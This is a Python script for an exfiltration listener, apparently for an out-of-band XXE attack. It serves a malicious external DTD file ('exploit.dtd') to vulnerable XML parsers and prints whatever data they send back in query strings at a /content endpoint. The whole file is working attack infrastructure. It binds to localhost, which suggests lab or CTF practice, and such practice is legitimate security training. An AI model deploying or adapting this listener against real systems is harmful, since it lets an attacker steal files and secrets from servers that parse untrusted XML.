from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


HOST = "localhost"
PORT = 80
DTD_PATH = Path(__file__).with_name("exploit.dtd")


class ExploitDTDHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        if self.path == "/exploit.dtd":
            if not DTD_PATH.exists():
                self.send_response(500)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.end_headers()
                self.wfile.write(b"exploit.dtd is missing")
                return
            
            payload = DTD_PATH.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        if self.path.startswith("/content"):
            query = self.path.split("?", 1)[-1] if "?" in self.path else ""
            print(f"Received data: {query}")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Data received")
            return

        # Default response for all other paths
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(b"Server is running")

if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), ExploitDTDHandler)
    print(f"Server running on http://{HOST}:{PORT}")
    print("Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        server.shutdown()
        server.server_close()
        print("Server stopped.")